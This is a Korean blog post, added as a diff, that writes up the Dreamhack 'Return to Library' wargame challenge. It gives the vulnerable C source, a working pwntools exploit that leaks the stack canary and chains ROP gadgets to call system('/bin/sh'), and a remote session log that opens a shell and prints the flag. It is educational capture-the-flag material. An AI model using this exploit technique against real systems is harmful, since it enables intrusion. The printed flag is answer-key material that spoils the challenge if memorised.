@@ -1,0 +1,168 @@
+---
+title: "[Dreamhack] Return to Library 문제 풀이"
+date: 2024-10-02
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: ㅏ... 머리 아파..."
+---
+
+# 문제 개요
+
+```c
+// Name: rtl.c
+// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie
+
+#include <stdio.h>
+#include <unistd.h>
+
+const char* binsh = "/bin/sh";
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Add system function to plt's entry
+  system("echo 'system@plt");
+
+  // Leak canary
+  printf("[1] Leak Canary\n");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  // Overwrite return address
+  printf("[2] Overwrite return address\n");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+
+  return 0;
+}
+```
+
+이 문제는 위와 같은 소스코드를 제공해주고 있다.
+
+보다시피 system함수를 사용해서 plt와 got를 불러오고 있고, Canary를 leak하는 Input과 RAO를 진행하는 Input으로 구성되어 있다.
+
+그리고 대놓고 전역변수 binsh(**포인터 변수**)에 '/bin/sh'를 저장해준다.
+
+~~이거 포인터 변수인줄 몰랐다가 하루종일 디버깅으로 삽질함. 문제를 똑바로 읽는 습관을 가지자.~~
+
+당연하게도 BOF가 두개의 Input에 빵빵 터지고 있다.
+
+그럼 Canary leak하고 RAO를 Canary를 맞춰서 진행한다.
+
+반환 주소는 system으로 전역 변수 binsh를 인자로 주면 끝!
+
+**당장 익스플로잇 코드를 이에 맞춰서 작성해보자.**
+# 익스플로잇 코드 작성
+
+```python
+from pwn import *
+
+p = remote('host1.dreamhack.games', 21205)
+#p = process('./rtl')
+elf = ELF('./rtl')
+
+binsh = 0x400874
+sys = elf.plt['system']
+pr = 0x0000000000400853
+ret = 0x0000000000400285
+
+leak_canary = b'A'* (56+1) # null byte
+pause()
+p.send(leak_canary)
+p.recvuntil(leak_canary)
+canary = u64(b'\x00'+p.recv(7))
+
+print('canary: '+hex(canary))
+print('sys: '+hex(sys))
+print('binsh: '+hex(binsh))
+
+payload = b'B' * 56
+payload += p64(canary)
+payload += b'C' * 8
+payload += p64(ret)
+payload += p64(pr)
+payload += p64(binsh)
+payload += p64(sys)
+
+p.sendlineafter(b"Buf: ", payload)
+
+p.interactive()
+```
+
+익스플로잇 코드는 위와 같다.
+
+이 코드 짜면서 설화가 하나 있는데, 간단하게 풀어보겠다.
+
+## 나의 미친 발상 시작
+
+문제 소스코드를 읽어보고 있는데, 뭔가 이상했다.
+
+바로 `system("echo 'system@plt");` 이 부분이다.
+
+보면 `system@plt`를 출력하는 코드 같았다. 근데 뭔가 착오가 있던건지 저 코드가 고대로 적용되어있었다.
+
+그래서 내가 다시 컴파일을 해서 문제를 풀어나갔다.
+## 문제 발생
+
+과연 무슨 문제가 발생했냐..
+
+익스플로잇 코드를 보면 `pop rdi` 가젯이 있는게 보일것이다. (pr이라는 변수가 pop rdi이다.)
+
+저게 내가 컴파일한 바이너리에는 존재하지 않는것이다. 머리가 터지는 순간이었다.
+
+그래서 나는 별생각 없이 Stack Alignment만 맞춰주려고 `ret` 가젯만 가지고 시도했다.
+
+근데 나중에 가서 보니까 system 내부에서 명령어를 처리해주는 부분에 인자가 뭐가 이상하게 들어갔다.
+
+`pop rdi`가 없어서 인자가 정상적으로 안들어간것이다. 이런 망할. 머리가 한번 더 pop 되는 순간이었다.
+
+알고보니 내가 문제였다. 왜 내가 컴파일을 했을까.. 이것 때문에 5시간을 버렸다. 그래도 빨리 찾아서 다행이다.
+
+## 문제 해결
+
+그래서 원래 있던 문제파일을 사용하기로 했다.
+
+그러니까 바로 해결되더군. ~~왜 그런 멍청한 생각을 했을까...~~
+
+바로 로컬 익스플로잇을 진행했더니 너무 잘된다. 이런.
+
+**그럼 이제 리모트 익스플로잇을 해보자.**
+# 익스플로잇!!
+
+```bash
+[+] Opening connection to host1.dreamhack.games on port 13500: Done
+[*] '/root/dh/Return_to_Library/rtl'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Paused (press any to continue)
+canary: 0xa41ad8e10bcd4600
+sys: 0x4005d0
+binsh: 0x400874
+[*] Switching to interactive mode
+$ ls
+flag
+rtl
+run.sh
+$ cat flag
+DH{13e0d0ddf0c71c0ac4410687c11e6b00}
+[*] Got EOF while reading in interactive
+$ 
+[*] Closed connection to host1.dreamhack.games port 13500
+```
+
+SUCCESS!!!!
+
+# 느낀점 또는 발전한 점
+
+확실한건 문제를 좀 잘 읽어봐야겠다는 생각을 가지게 되었다.
+
+소스코드를 주는데도 틀려서 솔직히 조금 쪽팔린다.. ㅠㅠ
+
+다음엔 더 나은 내가 되도록..
